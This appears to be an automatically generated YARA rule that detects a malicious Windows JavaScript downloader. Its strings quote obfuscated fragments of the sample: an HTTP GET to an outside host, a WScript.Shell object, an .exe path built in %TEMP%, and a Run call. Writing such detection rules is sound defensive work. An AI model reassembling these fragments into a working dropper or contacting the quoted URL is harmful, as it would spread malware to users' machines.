rule sig_20160330_bf424a40837424000afeda9869dc85b3 {
  meta:
    description = "datamaliciousorder - file 20160330_bf424a40837424000afeda9869dc85b3.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "6cfd34061c235adabbc89aaa7a61dd1787c08fec677b46cfb1fb068e242de822"

  strings:
    $s1  = "_BA[_BR](\"GET\", \"http://dev.orolatina.com/s3isk\", false);" fullword ascii
    $s2  = "function _AK(_X, _IW){_MT = _MT * 1; return _X - _IW;};" fullword ascii
    $s3  = "var _PV = function _TP() {return WScript[_O](\"WScript\"+\".Shell\");}(), _PB = 11;" fullword ascii
    $s4  = "if (_BA[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _OQ() {return _PV[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"EDH39fsiZHe9xhR.ex\" + \"e\";};" fullword ascii
    $s6  = "function _K(){return _LC0 + \"\";};" fullword ascii
    $s7  = "function _GZ() {return ((_S == true) && (_S == _R1)) ? 1 : _MT;};" fullword ascii
    $s8  = "function _RT(_P0){_PV[\"Run\"](_P0, _MT, _MT);};" fullword ascii
    $s9  = "function _C(_FI) {var _R = (1, 2, 3, 4, 5, _FI); return _R;};" fullword ascii
    $s10 = "return _AK(_R0, _G1);" fullword ascii
    $s11 = " while (_G0){" fullword ascii
    $s12 = "var _ZT = new this[\"Date\"]();" fullword ascii
    $s13 = "function _M(){return _O;};" fullword ascii
    $s14 = "function _GF()" fullword ascii
    $s15 = "function _SG(){return 22;};" fullword ascii
    $s16 = "var _R1 = false;" fullword ascii
    $s17 = "_R1 = true; " fullword ascii
    $s18 = "var _S = false;" fullword ascii
    $s19 = "_S = true; " fullword ascii
    $s20 = "var _R2 = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}